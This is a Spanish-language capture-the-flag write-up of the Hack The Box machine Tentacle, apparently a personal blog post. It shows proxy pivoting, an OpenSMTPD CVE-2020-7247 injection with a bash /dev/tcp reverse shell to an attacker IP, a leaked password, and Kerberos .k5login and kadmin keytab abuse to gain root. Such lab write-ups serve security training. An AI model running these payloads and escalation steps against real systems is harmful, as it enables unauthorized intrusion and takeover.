---
description: >-
  G4l1l30 write-up on the hard-difficulty Linux machine Tentacle from
  https://hackthebox.eu
title: Hack the Box - Tentacle Writeup
date: 2021-06-19 10:40:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, Linux,pivoting,proxychains,kerberos,ksu,kadmin,kinit,klist,wpad,nginx,OpenSMTPD,crontab,keytab,Environment Misconfiguration,File System Forensics,bash]    # TAG names should always be lowercase
show_image_post: true
image: /assets/img/Linux/Tentacle/InfoCard.png
---


# Summary



![Info-Card](/assets/img/Linux/Tentacle/Info-Card.png)

Tentacle es una VM Linux Hard con un servidor proxy Squid. Utilizando Proxychains nos 
revela un host que está haciendo uso de un servicio OpenSMTPD vulnerable. El Foothold se puede lograr
con la explotación de la misma(CVE-2020-7247). Un archivo de configuración de cliente SMTP revela una contraseña que ayuda a generar una
ticket Kerberos válido. Este ticket se puede utilizar para moverse lateralmente. Finalmente, un cronjob se puede explotar para
escalar a otro usuario(admin) que tenga privilegios para agregar al usuario root a los principals de Kerberos.



## Info de la maquina

| VM column  | Detalles      |
| ---------- | ------------- |
| Nombre     | Tentacle      |
| Dificultad | Hard          |
| Release    | Enero 23 2021 |
| OS         | Linux         |
| IP         | 10.10.10.224  |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.10.224** que apunte hacia **tentacle.htb** 

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.10.224``

![MassScan](/assets/img/Linux/Tentacle/MassScan.png)

Tenemos los siguientes dos puertos : **53**, **58**, **88**, **22** y **3128** , el resultado de Nmap nos arroja lo siguiente:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:31 BST
Nmap scan report for tentacle.htb (10.10.10.224)
Host is up (0.17s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-06-18 15:40:13Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
​```
```

Empezaremos por el puerto **3128**

![Squid](/assets/img/Linux/Tentacle/Squid.png)

Aqui podemos observar 3 cosas interesantes.

1. Un usuario : **j.nakazawa**
2. Un nuevo **Subdominio**
3. La version del servidor proxy **Squid: 4.11**

Lamentablemente no hay mucho que hacer con el punto tres(3), vamos a trabajar con el punto uno(1) y dos(2), empezaremos por este ultimo.

Nota: Agregar el nuevo subdominio a **/etc/hosts**

Antes de seguir, la razon para no empezar con la opcion  #1, es que es un Rabbit Hole, si usamos un AS-REP roasting ([+Info sobre AS-REP roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)) literalmente estaremos en un punto muerto con hash obtenido:



```bash
GetNPUsers.py -dc-ip REALCORP.HTB REALCORP.HTB/j.nakazawa -no-pass -format hashcat
```

![Rabbit_Hole](/assets/img/Linux/Tentacle/Rabbit_Hole.png)

```bash
$krb5asrep$18$j.nakazawa@REALCORP.HTB:77ddbbff0bb1831149fa8dbf59d9f8bb$9358934d4744ad17c7b7501d991601dc0491897a0c7956fabf2c78c889979541067c9b2aa6d707d8acc6d681f5fb0a216e9d9518660954227c2cc0e031081eba1b798557150645bee5c98884bec90d71b4b5bd2f90d79cad6e8db094cbe4066eff122b02d81972c760bb8fd599484563563f6a4cb12af93734a54e621847da9f10444d4d294ae173af692477dab09f0ebd553fa26c32a60f5635f3dd767007b4512f3c68fbddb310cc1effa0d6ae791029f3e3dfa93c84caf5870d517d3113d20e71e146a7b4c27aae7c964ca71d7d875a16e569d84c50714bcc
```

Buena suerte con ese hash :rabbit2:

# Enum. Subdominios

Para buscar los posibles subdominios, utilizaremos **dnsenum** :

```bash
dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb

#threads ---> Numeros de threads que se utilizan por queries
#dnsserver ---> Realiza queries de registro tipo A, NS y MX.
```

![dnsenum](/assets/img/Linux/Tentacle/dnsenum.png)

Obtenemos varios subdominios con lo que trabajar :

```text
ns.realcorp.htb.                        259200  IN    A        10.197.243.77
proxy.realcorp.htb.                     259200  IN   CNAME    ns.realcorp.htb.
ns.realcorp.htb.                        259200  IN    A        10.197.243.77
wpad.realcorp.htb.                      259200  IN    A        10.197.243.31
```

# Proxychains

Dado que no tenemos acceso a las IP internas, y no disponemos de muchas opciones, lo mas conveniente es usar Proxychains, es decir, haremos pivoting atraves de Proxy, lo haremos por el metodo dinamico, haremos la siguiente modificaciones en **/etc/proxychains.conf**  [Articulo de Vickie Li sobre Proxychain](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081).

Primero comentamos la siguiente linea : **strict_chain**

![proxychain](/assets/img/Linux/Tentacle/proxychain.png)

Luego vamos al final y agregamos el proxy para ejecutar nmap en 127.0.0.1 por el mismo puerto de Squid

​	![proxychain_02](/assets/img/Linux/Tentacle/proxychain_02.png)

Guardamos y ejecutamos proxychains+nmap hacia la IP **10.197.243.31** 

```bash
proxychains -f /etc/proxychain.conf nmap -sT -Pn 10.197.243.31
```

![wpad](/assets/img/Linux/Tentacle/wpad.png)

Tenemos algunos puertos interesantes Open, favor notar el tiempo de un simple escaneo :D. Vamos a echar un vistazo al puerto **80** 

```bash
proxychains firefox wpad.realcorp.htb
#Nota: Agregar 10.197.243.31 wpad.realcorp.htb en /etc/hosts
```

![WpadHTTP](/assets/img/Linux/Tentacle/WpadHTTP.png)

Nada interesante para ser honestos, haciendo un poco de research, podemos encontrar varios articulos que nos hablan de un archivo de configuracion : **wpad.dat** ([Referencia](https://plone.lucidsolutions.co.nz/web/http/web-proxy-auto-discovery-protocol-wpad-support-using-nginx) ) e intentamos con **dirsearch** la busquedad del mismo

```bash
sudo proxychains ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -e dat -f -t 20 -u http://wpad.realcorp.htb
```

![WpadData](/assets/img/Linux/Tentacle/WpadData.png)

Hay mejores formas de obtener ese resultado :^).

Nos descargamos el fichero :

```bash
proxychains -f /etc/proxychain.conf curl  http://wpad.realcorp.htb/wpad.dat -o wpad.dat
```

![WpadData](/assets/img/Linux/Tentacle/WpadData.png)

Contenido de **wpad.dat** :

```javascript
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}

```

Ok, una nueva dirrecion de red, ahora tenemos que escanear la subnet completa :D He aqui la razon de por que el first blood del user fue 14 horas despues. Este es un proceso tedioso tbh, una forma de reducir las horas es agregandole el **top--ports** y esto de por si es una aventura hacerlo.

```bash
proxychains nmap -sT --min-rate 2500 -Pn 10.241.251.0/24

#Este escaneo dura horas.
```

![PwnBox](/assets/img/Linux/Tentacle/PwnBox.png)

Ahi esta nuestro target, de los host up que identificamos, el unico con un solo puerto abierto : `10.241.251.113`

# OpenSMPTD 

Ahora toca verificar nuestro target, dado que solo tiene un puerto abierto, es bastante rapido.

```bash
proxychains -f /etc/proxychain.conf nmap -sT -sV -p 25 10.241.251.113
```

![OpenSMTPD](/assets/img/Linux/Tentacle/OpenSMTPD.png)

Un research en Google y el CVE indicado es el : CVE-2020-7247 que nos permite realizar un RCE.

## OpenSMPTD - Rev#1

Partiremos desde este [PoC+Examples](https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt)

Nos conectamos via **nc** 

```bash
proxychains nc 10.241.251.113 25

```

Seguido de esta serie de pasos:

```bash
HELO Gali #Saludar con "HELO" 
250 smtp.realcorp.htb Hello Gali [10.241.251.1], pleased to meet you
MAIL FROM:<;for d in x t J z 5 o N G K 9 3 B 1 n Y;do read d;done;bash;exit 0;> #Mail From tal cual
250 2.0.0 Ok
RCPT TO:<j.nakazawa@realcorp.htb> #En el PoC usan root pero no funciona, por logica esta es nuestra unica cuenta
250 2.1.5 Destination address valid: Recipient ok
DATA #Escriben data y luego Enter.
354 Enter mail, end with "." on a line by itself

#
#
#
#
#
#
#
#
#
#
#
#
#
0<&196;exec 196<>/dev/tcp/10.10.14.29/4444; sh <&196 >&196 2>&196 #Payload Rev.Shell Bash
. #<-------- es literalmente un punto *.* para que se envie la Data

```

![Steps](/assets/img/Linux/Tentacle/Steps.png)

![root_OpenSMTPD](/assets/img/Linux/Tentacle/root_OpenSMTPD.png)

## OpenSMPTD - Rev#2

Aprox hace 4 meses alguien ha adaptado un script en python justamente para esta maquina : 

* | [CVE-2020-7247 Custom Exploit ](https://github.com/QTranspose/CVE-2020-7247-exploit)

Esta es la forma de uso segun podemos leer en el repositorio: 

`python3 exploit.py <target_host> <target_port> <reverse_host> <reverse_port> <recipient_email>` 

El cual seria de esta forma : 

```bash
proxychains -f /etc/proxychains.conf python3 exploit.py 10.241.251.113 25 TuIP Puerto j.nakazawa@realcorp.htb
```

![Custom_Exploit_OpenSMTPD](/assets/img/Linux/Tentacle/Custom_Exploit_OpenSMTPD.png)

El exploit tiene una ligera modificacion para recibir argumentos, el original viene de aqui : [opensmtpd-remote-vulnerability/](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/)

# Privsec a User

Enum basico, vamos a **/home/j.nakazawa** y listamos el directorio.

![MSMTPRC](/assets/img/Linux/Tentacle/MSMTPRC.png)

Hay un archivo bastante llamativo **msmtprc**: 

![creds_jk](/assets/img/Linux/Tentacle/Tentacle\creds_jk.png)

Obtenemos las siguientes credenciales:

```text
j.nakazawa:sJB}RM>6Z~64_
```

Bien, lo primero que se me vino en mente es que nos serviria para acceder via SSH

![PermisoDenegado](/assets/img/Linux/Tentacle/PermisoDenegado.png)

Permiso denegado.

Si le echamos una ojeada a los puertos que tenemos abiertos, observamos que esta corriendo un servidor Kerberos, asi que podemos intentar generar un ticket y obtener el permiso para autenticarnos.

* | [Recurso | ](https://elcactusvolador.es/ssh-kerberos/) ---> Pueden buscar directamente en el apartado "Configura el cliente ssh de mickey y minnie..."
* | [Soluciones  a distintos errores en Kerberos y SSH](https://computing.fnal.gov/lqcd/troubleshooting-kerberos-kinit-problems/)
* [Instalacion de un Client Kerberos](https://nsrc.org/workshops/ws-files/2011/sanog17/exercises/ex1-kerberos-client.html)

Lo siguiente es instalar el cliente de Kerberos y proceder  a configurarlo:

```bash
sudo apt-get install krb5-user
```

Luego modificamos **/etc/krb5.conf** : 

```tex
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

[domain_realm]
        srv01.realcorp.htb = REALCORP.HTB
```

Modificamos nuestro /etc/hosts para que la IP 10.10.10.224 solo apunte srv01.realcorp.htb  : `10.10.10.224 srv01.realcorp.htb`

Generamos el ticket y verificamos que este disponible

```bash
kinit j.nakazawa #Generamos el Ticket
Password: sJB}RM>6Z~64_

klist #Verificamos la disponibilidad
Ticket cache: FILE:/tmp/krb5cc_1001
Default principal: j.nakazawa@REALCORP.HTB

Valid starting     Expires            Service principal
19/06/21 01:45:34  20/06/21 01:37:32  krbtgt/REALCORP.HTB@REALCORP.HTB

 
```

![Klist y Kinit](/assets/img/Linux/Tentacle/Klist y Kinit.png)



Si lo hicimos todo bien, podremos loguearnos sin necesidad de utilizar el password:

![usertxt](/assets/img/Linux/Tentacle/usertxt.png)



# Privsec J.Nakazawa a Admin

Enumerando podemos encontrar dos cosas interesantes:

1) Hay un usuario llamado Admin, dado que tenemos un servicio de Kerberos y si el usuario es Admin a toda la regla, nos dara una idea.

![usuario2s](/assets/img/Linux/Tentacle/usuario2s.png)

2) Crontab, hemos encontrado algo interesante en esta parte.

![crontab](/assets/img/Linux/Tentacle/crontab.png)

Contenido:

```bash
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/ 
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log

```

Un script sencillo, basicamente hace un backup de **/var/log/squid/** hacia el **/home/admin** . Verifiquemos los permisos 

![permisos_squid](/assets/img/Linux/Tentacle/permisos_squid.png)

Yep, somos parte del grupo **squid** y tenemos permisos de escritura, ya que estamos con Kerberos, vamos a crear un archivo llamado **.k5login**, este archivo reside en el **/home($HOME)** de un usuario, contiene una "x" cantidad de usuarios con tickets validos que pueden acceder a la cuenta del usuario donde se encuentre el archivo sin la necesidad de un password, el formato del archivo es sencillo:

```bash
j.nakazawa@REALCORP.HTB #Guardamos tal cual en el archivo .k5login
```

![K5login](/assets/img/Linux/Tentacle/K5login.png)

Luego copiamos : `cp .k5login /var/log/squid` , con esto podemos hacer `ssh` con **admin** 

![acceso_admin](/assets/img/Linux/Tentacle/acceso_admin.png)

Nota: Se pueden fijar las veces que falle.

+ | +Info de .k5login : [MIT .k5login](http://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html)

# Privsec admin to root

Lo primero es verificar quien es este usuario:

![privilegios_admin](/assets/img/Linux/Tentacle/privilegios_admin.png)

Nice group: admin :) 

Aqui una lista de los comandos de Kerberos : [Kerberos Command](https://docs.oracle.com/cd/E23823_01/html/816-4557/refer-5.html) y la administracion del mismo [MIT Kerberos Admin](https://www.kerberos.org/software/adminkerberos.pdf). Un archivo interesante es *keytab* que sirve para autenticar(en sistemas que usan Kerberos) usuarios remotos  sin necesidad de tener un password. La ubicacion del mismo esta :

![Keytab](/assets/img/Linux/Tentacle/Keytab.png)

`/etc/krb5kdc` 

Utilizamos **klist** para listar las key en el **keytab** :

```bash
klist -k /etc/krb5.keytab
```

![klist](/assets/img/Linux/Tentacle/klist.png)

La conexiones de administracion del servidor se hacen atraves de **kadmin** , administra la base de datos de Kerberos(tambien las politicas, los principals,etc), asi que, podemos administrar el **keytab** para autenticar un sistema remoto sin la necesidad de un password.

Vamos a usar el usuario **kadmin** : 

```bash
kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB 
#La flag -k espesifica el keytab que utilizara una tabla de claves que descifrara las respuesta del KDC en vez de un password
#La flag -t se usa en conjunto si o si con la flag -k. Utiliza el keytab para descifrar las respuestas del KDC

```

Luego procederemos a agregar la cuenta de *root* :

```bash
add_principal root@REALCORP.HTB
#Agregamos un password
#Salimos de kadmin : exit

```

+ | +info [Que es un Principals](https://docs.oracle.com/cd/E21455_01/common/tutorials/kerberos_principal.html)

![kadmin_2](/assets/img/Linux/Tentacle/kadmin_2.png)

Usamos **ksu** para cambiarnos a root 

Nota: ksu es decirlo de una forma llana el reemplazo de Kerberos del **su** .

![root](/assets/img/Linux/Tentacle/root.png)



Listo :)

![root2](/assets/img/Linux/Tentacle/root2.png)



# Recursos

| Contenido                                                    | url                                                          |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| AS-REP Roasting                                              | https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat |
| Proxying Like a Pro                                          | https://medium.com/swlh/proxying-like-a-pro-cccdc177b081     |
| Web Proxy Auto-Discovery Protocol (WPAD) support using Nginx | https://plone.lucidsolutions.co.nz/web/http/web-proxy-auto-discovery-protocol-wpad-support-using-nginx |
| LPE and RCE in OpenSMTPD (CVE-2020-7247)                     | https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt |
| CVE-2020-7247-exploit                                        | https://github.com/QTranspose/CVE-2020-7247-exploit          |
| Remote code execution in OpenSMTPD                           | https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/ |
| SSH + Kerberos                                               | https://elcactusvolador.es/ssh-kerberos/                     |
| Kerberos and SSH troubleshooting                             | https://computing.fnal.gov/lqcd/troubleshooting-kerberos-kinit-problems/ |
| Exercise 1: Set up a kerberos client                         | https://nsrc.org/workshops/ws-files/2011/sanog17/exercises/ex1-kerberos-client.html |
| .k5login                                                     | http://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html |
| Kerberos Commands                                            | https://docs.oracle.com/cd/E23823_01/html/816-4557/refer-5.html |
| The MIT Kerberos Administrator’s How-to Guide                | https://www.kerberos.org/software/adminkerberos.pdf          |
| Kerberos Principals                                          | https://docs.oracle.com/cd/E21455_01/common/tutorials/kerberos_principal.html |

